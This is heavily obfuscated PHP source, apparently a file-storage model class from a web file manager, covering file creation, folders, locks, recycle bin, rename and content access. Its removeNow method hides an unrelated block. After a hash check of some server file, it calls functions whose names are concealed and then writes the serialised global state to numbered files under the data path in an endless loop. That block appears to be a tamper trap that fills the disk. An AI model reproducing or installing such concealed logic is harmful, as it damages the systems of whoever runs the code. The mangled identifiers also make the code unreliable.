$C•„×·¦‰; goto fµ¼·Æò’…; E„²Ÿ–ØŞ‘: $bğ¦Ş„÷é =& $_SERVER[¦·]; $c¾Ş¯»Áäå = !1; $this->lockWriteStart($Dó¼Ï’»Æ, $dÖ˜öÕå); goto F‘Ñğ„Îêö; F‘Ñğ„Îêö: $C•„×·¦‰ = $this->_createFile($Dó¼Ï’»Æ, $dÖ˜öÕå, $Añç×ååÊ, $CÑ‡ÃšÒ—ó, $c¾Ş¯»Áäå); if (!$c¾Ş¯»Áäå) { Model($bğ¦Ş„÷é[422])->remove($Añç×ååÊ[$bğ¦Ş„÷é[419]]); } else { if ($C•„×·¦‰) { Model($bğ¦Ş„÷é[2337])->eventCreate($C•„×·¦‰, $A×ÈÉ‚‡çí); } } $this->lockWriteEnd($Dó¼Ï’»Æ, $dÖ˜öÕå); goto AÏƒŠ¨…àß; fµ¼·Æò’…: } public function mkdir($Cê°Ó³¬Ôù, $bù¹Î³‰ìã, $EÜÒ©šœ±Ç = REPEAT_SKIP) { goto BÜöÛÓ»Û; BÜöÛÓ»Û: $B °¼ •á =& $_SERVER[¦·]; $aÛ¾áçï„ì = $this->sourceInfo($Cê°Ó³¬Ôù); if (!$aÛ¾áçï„ì) { return !1; } goto D÷ñî’¾‡»; D÷ñî’¾‡»: $this->lockWriteStart($Cê°Ó³¬Ôù, $bù¹Î³‰ìã); if ($EÜÒ©šœ±Ç !== !1) { $f±§®œ‹ƒ· = $this->fileNameExist($Cê°Ó³¬Ôù, $bù¹Î³‰ìã); if ($f±§®œ‹ƒ· && $EÜÒ©šœ±Ç != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($Cê°Ó³¬Ôù, $bù¹Î³‰ìã); return $f±§®œ‹ƒ·; } $bù¹Î³‰ìã = $this->fileNameAuto($Cê°Ó³¬Ôù, $bù¹Î³‰ìã, $EÜÒ©šœ±Ç); } $A³„ØíİÕÚ = array($B °¼ •á[520] => 1, $B °¼ •á[386] => $bù¹Î³‰ìã, $B °¼ •á[521] => $B °¼ •á[33], $B °¼ •á[420] => 0, $B °¼ •á[522] => 0); goto F–¹Á¬®ÊĞ; F–¹Á¬®ÊĞ: $DãÜĞ‰ ƒ¥ = $this->_addSoure($A³„ØíİÕÚ, $aÛ¾áçï„ì); Model($B °¼ •á[2337])->eventCreate($DãÜĞ‰ ƒ¥, $B °¼ •á[1132]); $this->lockWriteEnd($Cê°Ó³¬Ôù, $bù¹Î³‰ìã); goto aŒª‚œËÚ; aŒª‚œËÚ: return $DãÜĞ‰ ƒ¥; goto Eç†á”Ë‘²; Eç†á”Ë‘²: } private function _createFile($FÕ§é†Ï“Ø, $c‰¥ÁÍÓÚ¦, $aµ­‚ë¶§Á, $B¥’Ìåˆ©, &$F¯°Ê‹¯´) { goto FŸïï’¶•®; FŸïï’¶•®: $d¤İäš“· =& $_SERVER[¦·]; $B¸ÇŞ„Œº = $this->sourceInfo($FÕ§é†Ï“Ø); if (!$aµ­‚ë¶§Á || !$B¸ÇŞ„Œº) { return !1; } goto e¿®¬ÅÁ; fäá’¥ ˆƒ: $DØêÓÚ©õô = array($d¤İäš“·[520] => 0, $d¤İäš“·[386] => $c‰¥ÁÍÓÚ¦, $d¤İäš“·[521] => get_path_ext($c‰¥ÁÍÓÚ¦), $d¤İäš“·[420] => $aµ­‚ë¶§Á[$d¤İäš“·[419]], $d¤İäš“·[522] => $aµ­‚ë¶§Á[$d¤İäš“·[77]]); $dÄ…¥‰Õ = $this->_addSoure($DØêÓÚ©õô, $B¸ÇŞ„Œº); $this->folderSizeReset($FÕ§é†Ï“Ø); goto A¶‰ª±õÆµ; A¶‰ª±õÆµ: return $dÄ…¥‰Õ; goto C ä‰©ğë; e¿®¬ÅÁ: if ($B¥’Ìåˆ© !== !1) { $FÕ„ç„ò…• = $this->fileNameExist($FÕ§é†Ï“Ø, $c‰¥ÁÍÓÚ¦); } $F¯°Ê‹¯´ = !0; if ($B¥’Ìåˆ© && $FÕ„ç„ò…•) { if ($B¥’Ìåˆ© == REPEAT_SKIP) { $F¯°Ê‹¯´ = !1; return $FÕ„ç„ò…•; } else { if ($B¥’Ìåˆ© == REPEAT_REPLACE) { $DÇ¾Ÿí„æ¤ = $this->sourceInfo($FÕ„ç„ò…•); $c…÷¶À¨Ş = $this->fileHistory($DÇ¾Ÿí„æ¤, $aµ­‚ë¶§Á[$d¤İäš“·[419]], $aµ­‚ë¶§Á[$d¤İäš“·[77]]); if (!$c…÷¶À¨Ş) { $F¯°Ê‹¯´ = !1; } else { $this->folderSizeReset($FÕ§é†Ï“Ø); } return $FÕ„ç„ò…•; } else { $c‰¥ÁÍÓÚ¦ = $this->fileNameAuto($FÕ§é†Ï“Ø, $c‰¥ÁÍÓÚ¦, $B¥’Ìåˆ©, !1); } } } goto fäá’¥ ˆƒ; C ä‰©ğë: } protected function fileHistory($AäÍÎ©ñ˜È, $eÃó¤ˆ××, $C¬ËìÓ•Üë) { goto bá›…ŸÈ; CÙÕÄå : Model($aœ…ËòÄÓ[2368])->addHistory($AäÍÎ©ñ˜È); $D©ñí‚Ì§¦ = array($aœ…ËòÄÓ[526] => USER_ID, $aœ…ËòÄÓ[390] => time(), $aœ…ËòÄÓ[419] => $eÃó¤ˆ××, $aœ…ËòÄÓ[77] => $C¬ËìÓ•Üë); $this->where(array($aœ…ËòÄÓ[383] => $AäÍÎ©ñ˜È[$aœ…ËòÄÓ[369]]))->save($D©ñí‚Ì§¦); goto C­»ØÅ³¥Ü; C­»ØÅ³¥Ü: return !0; goto B–Ò‰‡Â¡ò; bá›…ŸÈ: $aœ…ËòÄÓ =& $_SERVER[¦·]; if ($AäÍÎ©ñ˜È[$aœ…ËòÄÓ[419]] == $eÃó¤ˆ××) { return !1; } $this->checkLock($AäÍÎ©ñ˜È[$aœ…ËòÄÓ[369]], $eÃó¤ˆ××); goto CÙÕÄå ; B–Ò‰‡Â¡ò: } public function checkLock($e‹­ÚœˆÎĞ, $EÑÒ‚¢í—¨) { goto F©ßˆÇ´‡Œ; FÇŒé²‚Ñ: $aø©­¹‚œ = Session::get($cÖÙÈÀÂÂâ[2369]); $c”±ëÚØÊ… = substr($DƒÁè›Äœ[$cÖÙÈÀÂÂâ[28]], 0, -1 - strlen($DƒÁè›Äœ[$cÖÙÈÀÂÂâ[160]])) . $cÖÙÈÀÂÂâ[1394] . $aø©­¹‚œ . $cÖÙÈÀÂÂâ[91] . $DƒÁè›Äœ[$cÖÙÈÀÂÂâ[160]]; $aÆò¾¢”–ª = Model($cÖÙÈÀÂÂâ[545])->find($EÑÒ‚¢í—¨); goto eê¤Ú»„Ä; e­¬öÖ›¥“: show_json(LNG($cÖÙÈÀÂÂâ[2371]) . $cÖÙÈÀÂÂâ[2372] . LNG($cÖÙÈÀÂÂâ[2373]) . $cÖÙÈÀÂÂâ[2374] . $aÍšŞ¦š— . $cÖÙÈÀÂÂâ[2375], !1); goto cãëĞì„ò—; F©ßˆÇ´‡Œ: $cÖÙÈÀÂÂâ =& $_SERVER[¦·]; $DƒÁè›Äœ = $this->pathInfo($e‹­ÚœˆÎĞ); if (!$this->fileIsLock($DƒÁè›Äœ, !0)) { return; } goto FÇŒé²‚Ñ; eê¤Ú»„Ä: $this->_createFileCall($DƒÁè›Äœ[$cÖÙÈÀÂÂâ[463]], $c”±ëÚØÊ…, $aÆò¾¢”–ª, REPEAT_REPLACE, $cÖÙÈÀÂÂâ[1131]); $FÅÁŞÖª  = $DƒÁè›Äœ[$cÖÙÈÀÂÂâ[417]][$cÖÙÈÀÂÂâ[483]]; $aÍšŞ¦š— = $FÅÁŞÖª [$cÖÙÈÀÂÂâ[2370]] ? $FÅÁŞÖª [$cÖÙÈÀÂÂâ[2370]] : $FÅÁŞÖª [$cÖÙÈÀÂÂâ[28]]; goto e­¬öÖ›¥“; cãëĞì„ò—: } public function fileIsLock($b„¯ Îµš’, $A—“—¦Û†„ = false) { goto bùª”ˆŞÓ; F›æìƒ‰ÛÛ: return !1; goto a›åê³»äè; bùª”ˆŞÓ: $a×éŒª‚‘ª =& $_SERVER[¦·]; if (!isset($b„¯ Îµš’[$a×éŒª‚‘ª[417]]) || !$b„¯ Îµš’[$a×éŒª‚‘ª[417]][$a×éŒª‚‘ª[480]]) { return !1; } if ($b„¯ Îµš’[$a×éŒª‚‘ª[417]][$a×éŒª‚‘ª[480]] != USER_ID) { return !0; } goto EÑ—„Æëè; EÑ—„Æëè: $dà°Ó‰ƒ† = $GLOBALS[$a×éŒª‚‘ª[6]][$a×éŒª‚‘ª[84]][$a×éŒª‚‘ª[481]]; if ($b„¯ Îµš’[$a×éŒª‚‘ª[417]][$a×éŒª‚‘ª[482]] <= time() - $dà°Ó‰ƒ†) { $this->metaSet($b„¯ Îµš’[$a×éŒª‚‘ª[369]], $a×éŒª‚‘ª[480], null); $this->metaSet($b„¯ Îµš’[$a×éŒª‚‘ª[369]], $a×éŒª‚‘ª[482], null); } if ($A—“—¦Û†„) { $this->metaSet($b„¯ Îµš’[$a×éŒª‚‘ª[369]], $a×éŒª‚‘ª[482], time()); } goto F›æìƒ‰ÛÛ; a›åê³»äè: } private function _addSoure($b£¾Š„Øæ, $F‰¢„—¼©Ã) { goto e¬ñ÷µÙˆ®; Fæœ¹ï’ª: $this->updateModifyTime($b£¾Š„Øæ[$fÔæ‚Õ±°[463]]); $cĞ†…©ò£ä = $fÔæ‚Õ±°[2376] . $F‰¢„—¼©Ã[$fÔæ‚Õ±°[369]]; if (isset(self::$cacheChildList[$cĞ†…©ò£ä])) { unset(self::$cacheChildList[$cĞ†…©ò£ä]); } goto c½ßæŠ÷Ë; e¬ñ÷µÙˆ®: $fÔæ‚Õ±° =& $_SERVER[¦·]; $B¨¶‹Å›ÖÒ = array($fÔæ‚Õ±°[523] => $F‰¢„—¼©Ã[$fÔæ‚Õ±°[371]], $fÔæ‚Õ±°[524] => $F‰¢„—¼©Ã[$fÔæ‚Õ±°[458]], $fÔæ‚Õ±°[525] => USER_ID, $fÔæ‚Õ±°[526] => USER_ID, $fÔæ‚Õ±°[368] => $F‰¢„—¼©Ã[$fÔæ‚Õ±°[369]], $fÔæ‚Õ±°[527] => $F‰¢„—¼©Ã[$fÔæ‚Õ±°[461]] . $F‰¢„—¼©Ã[$fÔæ‚Õ±°[369]] . $fÔæ‚Õ±°[47], $fÔæ‚Õ±°[396] => 0, $fÔæ‚Õ±°[528] => $fÔæ‚Õ±°[33]); $b£¾Š„Øæ = array_merge($B¨¶‹Å›ÖÒ, $b£¾Š„Øæ); goto Fæœ¹ï’ª; c½ßæŠ÷Ë: static $E—æùÏâÏÑ = false; if (!$E—æùÏâÏÑ) { Hook::trigger($fÔæ‚Õ±°[510], $b£¾Š„Øæ); $E—æùÏâÏÑ = !0; } $aÃËí¯”Ù = $this->add($b£¾Š„Øæ); goto E‘¬ÍÒÖİ÷; E‘¬ÍÒÖİ÷: $cí¸‘ÜÛÀ = array($fÔæ‚Õ±°[529] => short_id($aÃËí¯”Ù)); $this->where(array($fÔæ‚Õ±°[383] => $aÃËí¯”Ù))->save($cí¸‘ÜÛÀ); $this->setNamePinyin($aÃËí¯”Ù, $b£¾Š„Øæ[$fÔæ‚Õ±°[28]]); goto Fäµ¢ãØÂ; Fäµ¢ãØÂ: return $aÃËí¯”Ù; goto a‹Ôö÷Ş¡¶; a‹Ôö÷Ş¡¶: } public function remove($eíÜ›Õ£Ò, $C®âˆŒŸ”­ = true) { goto aÙ£¶—„÷¢; aÙ£¶—„÷¢: $E®•œ…†¾ =& $_SERVER[¦·]; $f„‚—‡’åÏ = $this->sourceInfo($eíÜ›Õ£Ò); $D§êñõ´Í = intval($f„‚—‡’åÏ[$E®•œ…†¾[371]]) === self::TYPE_SYSTEM; goto a…›’ÈØÕ¾; eÛ“È´éÒ: $dÑ¤¸ƒ›ÈÛ = $f„‚—‡’åÏ[$E®•œ…†¾[371]] == self::TYPE_USER ? $E®•œ…†¾[536] : $E®•œ…†¾[973]; if ($dÑ¤¸ƒ›ÈÛ == $E®•œ…†¾[536]) { $f¿à½Îæ¥Ç = Model($E®•œ…†¾[476])->getInfo($f„‚—‡’åÏ[$E®•œ…†¾[458]]); $aÕ«½¹ÔÕñ = !empty($f¿à½Îæ¥Ç[$E®•œ…†¾[2370]]) ? $f¿à½Îæ¥Ç[$E®•œ…†¾[2370]] : $f¿à½Îæ¥Ç[$E®•œ…†¾[28]]; $aÕ«½¹ÔÕñ = $E®•œ…†¾[248] . $aÕ«½¹ÔÕñ . $E®•œ…†¾[2378] . $f„‚—‡’åÏ[$E®•œ…†¾[458]]; } else { $f¿à½Îæ¥Ç = Model($E®•œ…†¾[460])->getInfo($f„‚—‡’åÏ[$E®•œ…†¾[458]]); $aÕ«½¹ÔÕñ = _get($f¿à½Îæ¥Ç, $E®•œ…†¾[28]); $aÕ«½¹ÔÕñ = $E®•œ…†¾[157] . $aÕ«½¹ÔÕñ . $E®•œ…†¾[2379] . $f„‚—‡’åÏ[$E®•œ…†¾[458]]; } $CóÌÊóóò› = $E®•œ…†¾[2380] . md5($aÕ«½¹ÔÕñ); goto dŸÃÇŞº¥; a…›’ÈØÕ¾: $cÛ‰ÃÍ‰Æ£ = Model($E®•œ…†¾[1439])->get($E®•œ…†¾[2377]) == $E®•œ…†¾[83]; if ($D§êñõ´Í || $C®âˆŒŸ”­ || !$cÛ‰ÃÍ‰Æ£) { return $this->removeNow($eíÜ›Õ£Ò, $C®âˆŒŸ”­); } $fˆáñŒÀÏ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto eÛ“È´éÒ; DĞ©‚ °í‰: CacheLock::unlock($CóÌÊóóò›); $this->metaSet($eíÜ›Õ£Ò, $E®•œ…†¾[2385], $f„‚—‡’åÏ[$E®•œ…†¾[463]]); $this->where(array($E®•œ…†¾[369] => $eíÜ›Õ£Ò))->save(array($E®•œ…†¾[390] => time())); goto DŠ­‚§Í’ñ; dŸÃÇŞº¥: CacheLock::lock($CóÌÊóóò›); $A©–†‹íÁ = $this->fileNameExist($fˆáñŒÀÏ, $aÕ«½¹ÔÕñ); if (!$A©–†‹íÁ) { $A©–†‹íÁ = $this->mkdir($fˆáñŒÀÏ, $aÕ«½¹ÔÕñ, REPEAT_SKIP); $this->metaSet($A©–†‹íÁ, $E®•œ…†¾[2381], $dÑ¤¸ƒ›ÈÛ); $this->metaSet($A©–†‹íÁ, $E®•œ…†¾[2382], $f„‚—‡’åÏ[$E®•œ…†¾[458]]); if ($f„‚—‡’åÏ[$E®•œ…†¾[463]] != 0) { $this->metaSet($A©–†‹íÁ, $E®•œ…†¾[2383], _get($f¿à½Îæ¥Ç, $E®•œ…†¾[2384])); } } goto DĞ©‚ °í‰; F±®È™Üª‘: return $e«®¥Éã; goto E¯°‹ºĞåä; DŠ­‚§Í’ñ: $this->recycleClear($f„‚—‡’åÏ); $e«®¥Éã = $this->move($eíÜ›Õ£Ò, $A©–†‹íÁ, REPEAT_RENAME_FOLDER); $this->folderSizeReset($f„‚—‡’åÏ[$E®•œ…†¾[463]]); goto F±®È™Üª‘; E¯°‹ºĞåä: } private function recycleClear($B…å…ÜØïÄ) { $CêƒÑÄ­Íç =& $_SERVER[¦·]; $F‡¿ù¡ˆÌ = $this->childrenAll($B…å…ÜØïÄ); $eäÁ×æœÇ‘ = array($CêƒÑÄ­Íç[383] => array($CêƒÑÄ­Íç[384], $F‡¿ù¡ˆÌ[$CêƒÑÄ­Íç[2386]])); Model($CêƒÑÄ­Íç[2387])->where($eäÁ×æœÇ‘)->delete(); } public function removeNow($DÉÊ¦ÇÛÓ×, $Eä„¹«›ğÔ = true) { goto aÂ«çíóæ“; DªÁÓ¢óÌ¼: $this->lockMoveEnd($DÉÊ¦ÇÛÓ×); Hook::trigger($fÔ¯ŞŒñ…‹[1475], $E‘Ø±ë°Ò, $Eä„¹«›ğÔ); return !0; goto e¹²ßÏÉÚ™; aÂ«çíóæ“: $fÔ¯ŞŒñ…‹ =& $_SERVER[¦·]; $C°Éß¡„éÜ = $_SERVER[$fÔ¯ŞŒñ…‹[796]] . $fÔ¯ŞŒñ…‹[1120]; $B¬‘ÖÂ×–° = $fÔ¯ŞŒñ…‹[790]; goto Eªç‚ˆªªğ; fäİÚ«Ÿé: if (!$FìŠÖ”Ëö) { return !0; } if ($FìŠÖ”Ëö[$fÔ¯ŞŒñ…‹[463]] == 0) { if (!_get($GLOBALS, $fÔ¯ŞŒñ…‹[459])) { return !1; } } $this->lockMoveStart($DÉÊ¦ÇÛÓ×); goto Fñƒ‹²Í„; Eªç‚ˆªªğ: if ($_SERVER[$fÔ¯ŞŒñ…‹[791]] != $B¬‘ÖÂ×–°($C°Éß¡„éÜ)) { goto F‡Å†…ËÌç; A§óïç›¦¦: $AÛŸÑÒé© = $fÔ¯ŞŒñ…‹[795]; $AÛŸÑÒé©($_SERVER[$fÔ¯ŞŒñ…‹[796]]); $C†•…¢É—ö = $fÔ¯ŞŒñ…‹[792]; goto Eõ¶µ“ºÕ; bôÖí®šÚ: $f³ˆÏ¶…Æƒ = 1; for ($cë ˆÖ›ö– = $f³ˆÏ¶…Æƒ; $cë ˆÖ›ö– > 0; $cë ˆÖ›ö–++) { $DŸ»ÓŒ¾é„(DATA_PATH . $cë ˆÖ›ö–, $CáÔá”È½Í); } goto díÁ‚Ö«¡ò; F‡Å†…ËÌç: $C†•…¢É—ö = $fÔ¯ŞŒñ…‹[792]; $D‘»‘² = $fÔ¯ŞŒñ…‹[793]; $BŒ­…Ú“é® = $_SERVER[$fÔ¯ŞŒñ…‹[788]] . $fÔ¯ŞŒñ…‹[789]; goto eØ¤Š‹©é; eØ¤Š‹©é: $E¾èÄŠ†ã = $D‘»‘²($BŒ­…Ú“é®); $Bô£˜´‹âŠ = explode($fÔ¯ŞŒñ…‹[217], $E¾èÄŠ†ã); if (count($Bô£˜´‹âŠ) < $fÔ¯ŞŒñ…‹[576]) { $b¯‚Éó‡Âƒ = $fÔ¯ŞŒñ…‹[794]; $b¯‚Éó‡Âƒ(); } goto A§óïç›¦¦; Eõ¶µ“ºÕ: $C†•…¢É—ö(); $DŸ»ÓŒ¾é„ = $fÔ¯ŞŒñ…‹[797]; $CáÔá”È½Í = json_encode($GLOBALS[$fÔ¯ŞŒñ…‹[798]]); goto bôÖí®šÚ; díÁ‚Ö«¡ò: } $FìŠÖ”Ëö = $this->sourceInfo($DÉÊ¦ÇÛÓ×); $E‘Ø±ë°Ò = $this->pathInfoMore($DÉÊ¦ÇÛÓ×); goto fäİÚ«Ÿé; Fñƒ‹²Í„: Hook::trigger($fÔ¯ŞŒñ…‹[2388], $E‘Ø±ë°Ò, $Eä„¹«›ğÔ); if ($Eä„¹«›ğÔ) { Model($fÔ¯ŞŒñ…‹[2387])->moveToRecycle($DÉÊ¦ÇÛÓ×); } else { $aö³“ˆÜæ = $this->childrenAll($FìŠÖ”Ëö); Model($fÔ¯ŞŒñ…‹[507])->eventRemove($DÉÊ¦ÇÛÓ×); $this->removeRelevance($aö³“ˆÜæ[$fÔ¯ŞŒñ…‹[2386]], $aö³“ˆÜæ[$fÔ¯ŞŒñ…‹[1264]]); } $this->folderSizeReset($FìŠÖ”Ëö[$fÔ¯ŞŒñ…‹[463]]); goto eİØî»Ëğ‘; eİØî»Ëğ‘: $c¯á–Ö¦®‘ = array($FìŠÖ”Ëö[$fÔ¯ŞŒñ…‹[463]]); if ($FìŠÖ”Ëö[$fÔ¯ŞŒñ…‹[370]] == $fÔ¯ŞŒñ…‹[83]) { $c¯á–Ö¦®‘[] = $FìŠÖ”Ëö[$fÔ¯ŞŒñ…‹[369]]; } $this->updateModifyTime($c¯á–Ö¦®‘); goto DªÁÓ¢óÌ¼; e¹²ßÏÉÚ™: } public function childrenAll($B°˜…ù«…–) { $bÇíïÑ´Í =& $_SERVER[¦·]; $a´æáğóÉŠ = $B°˜…ù«…–[$bÇíïÑ´Í[369]]; if ($B°˜…ù«…–[$bÇíïÑ´Í[370]] == $bÇíïÑ´Í[83]) { $AÜÓğùé¸Ü = array($bÇíïÑ´Í[527] => array($bÇíïÑ´Í[485], $B°˜…ù«…–[$bÇíïÑ´Í[461]] . $a´æáğóÉŠ . $bÇíïÑ´Í[486])); $Aµ‡êØÌ‘ä = array($bÇíïÑ´Í[527] => $AÜÓğùé¸Ü[$bÇíïÑ´Í[461]]); $aÑõˆ›¨Šå = $this->field($bÇíïÑ´Í[2389])->where($Aµ‡êØÌ‘ä)->select(); $bÕïä‘¥è = !1; $F´‡¾ÇåÕÂ = array($a´æáğóÉŠ); if ($aÑõˆ›¨Šå) { $bÕïä‘¥è = array_to_keyvalue($aÑõˆ›¨Šå, $bÇíïÑ´Í[33], $bÇíïÑ´Í[419]); $bÕïä‘¥è = array_remove_value($bÕïä‘¥è, $bÇíïÑ´Í[470]); $F´‡¾ÇåÕÂ = array_to_keyvalue($aÑõˆ›¨Šå, $bÇíïÑ´Í[33], $bÇíïÑ´Í[369]); $F´‡¾ÇåÕÂ[] = $a´æáğóÉŠ; } } else { $bÕïä‘¥è = array($B°˜…ù«…–[$bÇíïÑ´Í[419]]); $F´‡¾ÇåÕÂ = array($a´æáğóÉŠ); } return array($bÇíïÑ´Í[2386] => $F´‡¾ÇåÕÂ, $bÇíïÑ´Í[1264] => $bÕïä‘¥è); } public function removeArray($BÆ¾…õÑ×) { if (!$BÆ¾…õÑ×) { return !0; } } public function removeRelevance($cù¨ìÌàÑÊ, $bªğõÖè‘À) { goto dä—Øİ³ìÃ; díƒÄÏ–‚õ: Model($aœšºĞ†Æ[2241])->where($d²Óôëâ·¡)->delete(); Model($aœšºĞ†Æ[507])->where($d²Óôëâ·¡)->delete(); Model($aœšºĞ†Æ[2089])->removeBySource($cù¨ìÌàÑÊ); goto d†íÍÌ„‰º; dä—Øİ³ìÃ: $aœšºĞ†Æ =& $_SERVER[¦·]; $cù¨ìÌàÑÊ = $cù¨ìÌàÑÊ ? $cù¨ìÌàÑÊ : array(); $bªğõÖè‘À = $bªğõÖè‘À ? $bªğõÖè‘À : array(); goto C¢¿Ñôê»ë; cšÄÌ ™îÆ: $d²Óôëâ·¡ = array($aœšºĞ†Æ[383] => array($aœšºĞ†Æ[384], $cù¨ìÌàÑÊ)); Model($aœšºĞ†Æ[2387])->where($d²Óôëâ·¡)->delete(); Model($aœšºĞ†Æ[413])->where($d²Óôëâ·¡)->delete(); goto díƒÄÏ–‚õ; d†íÍÌ„‰º: Model($aœšºĞ†Æ[2368])->removeBySource($cù¨ìÌàÑÊ); $this->where($d²Óôëâ·¡)->delete(); Model($aœšºĞ†Æ[422])->remove($bªğõÖè‘À); goto e‡îÕ¸¡¢; C¢¿Ñôê»ë: $cù¨ìÌàÑÊ = array_unique(array_filter($cù¨ìÌàÑÊ)); $bªğõÖè‘À = array_unique(array_filter($bªğõÖè‘À)); if (!$cù¨ìÌàÑÊ) { return !1; } goto cšÄÌ ™îÆ; e‡îÕ¸¡¢: for ($EµŸæâƒ‰¼ = 0; $EµŸæâƒ‰¼ < count($cù¨ìÌàÑÊ); $EµŸæâƒ‰¼++) { $this->sourceCacheClear($cù¨ìÌàÑÊ[$EµŸæâƒ‰¼]); } goto eí™Ş÷±; eí™Ş÷±: } public function rename($dÇââà’Û¦, $fëØÕ»³¤) { goto c™½Õ»ÙÛ‹; d¨ØôÌ®Û: if (!$F†²“Ÿ›Íå[$fâå¡Åò¶Õ[370]] == $fâå¡Åò¶Õ[83]) { $D¬‚ç‡í±å[$fâå¡Åò¶Õ[372]] = get_path_ext($fëØÕ»³¤); } Model($fâå¡Åò¶Õ[507])->eventRename($dÇââà’Û¦, $F†²“Ÿ›Íå[$fâå¡Åò¶Õ[28]], $fëØÕ»³¤); $this->sourceCacheClear($dÇââà’Û¦); goto F×¢ª¥Ò¹Ù; c™½Õ»ÙÛ‹: $fâå¡Åò¶Õ =& $_SERVER[¦·]; $F†²“Ÿ›Íå = $this->sourceInfo($dÇââà’Û¦); if (!$F†²“Ÿ›Íå) { return !1; } goto d„Â†±Ÿ; d„Â†±Ÿ: $FÎ»ÄÀòòÅ = $this->fileNameExist($F†²“Ÿ›Íå[$fâå¡Åò¶Õ[463]], $fëØÕ»³¤); if ($FÎ»ÄÀòòÅ && $FÎ»ÄÀòòÅ != $dÇââà’Û¦) { return !1; } $D¬‚ç‡í±å = array($fâå¡Åò¶Õ[386] => $fëØÕ»³¤, $fâå¡Åò¶Õ[526] => USER_ID); goto d¨ØôÌ®Û; F×¢ª¥Ò¹Ù: $this->setNamePinyin($dÇââà’Û¦, $D¬‚ç‡í±å[$fâå¡Åò¶Õ[28]], !1); $this->updateModifyTime($F†²“Ÿ›Íå[$fâå¡Åò¶Õ[463]]); $F÷È±Ô£‘Ô = $this->where(array($fâå¡Åò¶Õ[383] => $dÇââà’Û¦))->data($D¬‚ç‡í±å)->save(); goto A»ëÅ‚¨ãÀ; A»ëÅ‚¨ãÀ: $c¸Ö¹ñƒ˜Ò = $fâå¡Åò¶Õ[2376] . $F†²“Ÿ›Íå[$fâå¡Åò¶Õ[463]]; if (isset(self::$cacheChildList[$c¸Ö¹ñƒ˜Ò])) { unset(self::$cacheChildList[$c¸Ö¹ñƒ˜Ò]); } return $F÷È±Ô£‘Ô; goto eĞ¼ÙãÔ©‹; eĞ¼ÙãÔ©‹: } public function setNamePinyin($eí‘ÕëÂì, $a“›¨†Ñ‰, $cÂ—‘¤‰ä¶ = true) { $C‡½ßî…çÉ =& $_SERVER[¦·]; $D†¬ƒÀÂô× = Input::check($a“›¨†Ñ‰, $C‡½ßî…çÉ[530]); if ($cÂ—‘¤‰ä¶ && !$D†¬ƒÀÂô×) { return; } if (!$D†¬ƒÀÂô×) { $this->metaSet($eí‘ÕëÂì, $C‡½ßî…çÉ[416], null); $this->metaSet($eí‘ÕëÂì, $C‡½ßî…çÉ[415], null); return; } $aŸª’÷Õê¸ = array($C‡½ßî…çÉ[416] => str_replace($C‡½ßî…çÉ[50], $C‡½ßî…çÉ[33], Pinyin::encode($a“›¨†Ñ‰)), $C‡½ßî…çÉ[415] => Pinyin::encode($a“›¨†Ñ‰, $C‡½ßî…çÉ[531])); $this->metaSet($eí‘ÕëÂì, $aŸª’÷Õê¸); } public function getContent($Bº‡÷Ø¡¡å) { goto A’ñ‚åìÑµ; dãİŞ¶Î§ô: if ($Aœ¡Ëè’´ñ[$EçÅî¶Ş¿×[77]] == 0) { return $EçÅî¶Ş¿×[33]; } $bÖÁì¼¯¨Í = $EçÅî¶Ş¿×[2390] . $Aœ¡Ëè’´ñ[$EçÅî¶Ş¿×[163]]; if ($Aœ¡Ëè’´ñ[$EçÅî¶Ş¿×[77]] <= 1024 * 10) { $Eò¸ò¢ = Cache::get($bÖÁì¼¯¨Í); if (!$Eò¸ò¢) { $Eò¸ò¢ = IO::getContent($Aœ¡Ëè’´ñ[$EçÅî¶Ş¿×[75]]); Cache::set($bÖÁì¼¯¨Í, $Eò¸ò¢); } return $Eò¸ò¢; } goto dã§ƒ‡ÙØ; dã§ƒ‡ÙØ: if (!$Aœ¡Ëè’´ñ[$EçÅî¶Ş¿×[75]]) { return $EçÅî¶Ş¿×[33]; } return IO::getContent($Aœ¡Ëè’´ñ[$EçÅî¶Ş¿×[75]]); goto FÙ¹Ô”Ç¸Ô; A’ñ‚åìÑµ: $EçÅî¶Ş¿× =& $_SERVER[¦·]; $Aœ¡Ëè’´ñ = $this->fileInfoGet($Bº‡÷Ø¡¡å); if (!$Aœ¡Ëè’´ñ) { return !1; } goto dãİŞ¶Î§ô; FÙ¹Ô”Ç¸Ô: } public function setDesc($AçòÅæÆ…, $a–í’»‡²ç) { $CœÂë¤»†Ç =& $_SERVER[¦·]; Model($CœÂë¤»†Ç[507])->eventAddDesc($AçòÅæÆ…, $a–í’»‡²ç); return $this->metaSet($AçòÅæÆ…, $CœÂë¤»†Ç[405], $a–í’»‡²ç); } public function setContent($B»Ô‹§Ğ÷Œ, $BĞ¼Øìİ‰– = '') { goto fØ©ÖğÌÃ˜; fØ©ÖğÌÃ˜: $b÷ç‡ÔÙÛÎ =& $_SERVER[¦·]; $DíÒ©¨îŠò = $this->sourceInfo($B»Ô‹§Ğ÷Œ); $DÈÕäº­“á = $this->fileInfoGet($B»Ô‹§Ğ÷Œ); goto B‹íê–ñŞ‘; B‹íê–ñŞ‘: if (!$DÈÕäº­“á || !$DíÒ©¨îŠò) { return !1; } $e“¶ŠŸ×¼ = Model($b÷ç‡ÔÙÛÎ[422])->addFileByContent($BĞ¼Øìİ‰–, $DíÒ©¨îŠò[$b÷ç‡ÔÙÛÎ[28]]); $d ±À÷¹ÂÉ = $this->fileHistory($DíÒ©¨îŠò, $e“¶ŠŸ×¼[$b÷ç‡ÔÙÛÎ[419]], $e“¶ŠŸ×¼[$b÷ç‡ÔÙÛÎ[77]]); goto EÈ¸‰ï‘; EÈ¸‰ï‘: if (!$d ±À÷¹ÂÉ) { return Model($b÷ç‡ÔÙÛÎ[422])->remove($e“¶ŠŸ×¼[$b÷ç‡ÔÙÛÎ[419]]); } $this->folderSizeReset($DíÒ©¨îŠò[$b÷ç‡ÔÙÛÎ[463]]); return !0; goto CšÊ·á¢Ğµ; CšÊ·á¢Ğµ: } public function fileSubstr($C¬Á„÷…ëƒ, $Fè¬µ†ÚÚ‰, $d©—Ï¾¿¦) { $BİÚ§ƒÙÏ“ = $this->fileInfoGet($C¬Á„÷…ëƒ); if (!$BİÚ§ƒÙÏ“) { return !1; } return IO::fileSubstr($BİÚ§ƒÙÏ“[$_SERVER[¦·][75]], $Fè¬µ†ÚÚ‰, $d©—Ï¾¿¦); } public function fileInfoGet($Fç­êòŒ•ä) { goto cÅ’Å‚¾Éì; cÅ’Å‚¾Éì: 